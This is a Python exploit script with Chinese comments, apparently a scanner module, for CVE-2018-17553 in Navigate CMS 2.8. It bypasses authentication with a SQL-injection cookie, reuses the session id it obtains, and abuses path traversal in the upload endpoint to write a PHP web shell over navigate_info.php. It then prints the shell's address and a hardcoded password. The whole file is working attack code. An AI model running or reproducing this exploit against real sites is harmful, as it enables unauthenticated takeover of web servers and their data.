# -*- coding: utf-8 -*-

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import sys

r'''
Usage:
    moon.py -u  navigate http://x.x.x.x:xx
    V2.8版本测试存在此漏洞。
    参考  https://www.exploit-db.com/exploits/45561/
          https://github.com/rapid7/metasploit-framework/pull/10704
    上面msf的利用脚本会向该cms的/navigate/navigate_info.php文件写入shell，以下脚本也是利用的这个思路.
    因此如果/navigate/navigate_info.php文件不存在，会造成shell写入失败。
    Navigate CMS v2.8 测试成功
    绕过登录限制
    cookie' => 'navigate-user=\" OR TRUE--%20'
'''

def attack(URL):
    print('[+]开始检测-navigate_Unauthenticated_Remote_Code_Execution_CVE-2018-17553。[+]')
    user_agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36"
    headers={"User-Agent":user_agent}
    try:
        urls = [URL + '/login.php',URL+'/navigate/login.php']
        for url in urls:
            print('检测的URL为：'+url)
            cookies = {'navigate-user':r'\" OR TRUE--%20'}
            r = requests.get(url,headers=headers,cookies=cookies,verify=False,allow_redirects=False)
            if r.status_code == 302:
                print('[+]返回值为：'+str(r.status_code)+' 可能存在漏洞。')
                #print(r.cookies.items()[0][1])#获取session_id
                global Session_id
                Session_id = r.cookies.items()[0][1]
            else:
                print('[-]返回值为：' + str(r.status_code) + ' 不存在漏洞。')
    except:
        print('[-]未发现该漏洞。!')
    else:
        try:
            url = URL + '/navigate/navigate_info.php'
            r = requests.get(url)
            scode = r.status_code
            if scode == 200:
                print('[+]访问/navigate/navigate_info.php成功，开始写入。')
                try:
                    pwd = sys.argv[0][:33]  # 获取当前文件夹的路径
                    url = URL + f'/navigate/navigate_upload.php?id=../../../navigate_info.php&session_id={Session_id}&engine=picnik'
                    m = MultipartEncoder(fields={
                        'Content-Disposition': 'form-data; name="file"; filename="tCc2QJ7PUxSC"',
                        'file': ('shellname', open(f'{pwd}\\navigate_vuln\\88.php', 'rb'), 'image/jpeg'),
                    })
                    headers = {
                        'Content-Type': m.content_type,
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
                    }
                    r = requests.post(url, data=m, headers=headers)
                    #print(r.status_code)    #值为200上传正常
                    print('一句话地址为：' + URL + '/navigate/navigate_info.php')
                    print('密码为：' + 'tBjyWW3456tBjyWWtBjyWW87ttBjyWW')
                except:
                    print('上传shell发生错误。')
            else:
                print('[-]访问/navigate/navigate_info.php失败，无法进行shell写入。')
        except:
            print('[-]访问/navigate/navigate_info.php发生错误。')


    print('[+]检测结束-navigate_Unauthenticated_Remote_Code_Execution_CVE-2018-17553。[+]')
    print('\n')

if __name__ == '__main__':
    attack()